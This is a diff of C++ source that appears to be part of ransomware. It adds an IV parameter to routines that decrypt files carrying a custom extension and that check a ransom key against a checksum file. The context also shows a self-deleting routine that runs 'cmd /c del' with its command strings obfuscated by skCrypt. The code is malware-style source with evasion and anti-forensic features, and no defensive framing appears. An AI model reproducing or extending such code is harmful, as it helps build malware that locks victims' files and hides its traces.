@@ -55,7 +55,7 @@ void DeleteMe(const string& myPath) {
     system(((string)(char*)calloc(myPath.length() + 11, sizeof(char)) + (string)skCrypt("start cmd /c \"del ") + myPath + (string)skCrypt(" & exit\"")).c_str());
 }
 
-void DecryptFiles(const vector<string>& files, const string& key) {
+void DecryptFiles(const vector<string>& files, const string& key, const string& iv) {
     for (string file : files) {
 
         HANDLE hFile = CreateFileA(file.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -68,7 +68,7 @@ void DecryptFiles(const vector<string>& files, const string& key) {
         ifstream fin(file, ios::in);
         string data((istreambuf_iterator<char>(fin)), istreambuf_iterator<char>());
         fin.close();
-        vector<BYTE> content = base64_decode(aes_decrypt(key, data, IV));
+        vector<BYTE> content = base64_decode(aes_decrypt(key, data, iv));
         
         string newFileName = "";
         for (int i = 0; i < file.size() - (FILE_EXTENSION).size(); i++)
@@ -82,9 +82,9 @@ void DecryptFiles(const vector<string>& files, const string& key) {
     }
 }
 
-bool CheckKey(const string& key) {
+bool CheckKey(const string& key, const string& iv) {
     try {
-        DecryptFiles({ CHECKSUM_FILE + FILE_EXTENSION }, key);
+        DecryptFiles({ CHECKSUM_FILE + FILE_EXTENSION }, key, iv);
     }
     catch (...) {
         return false;
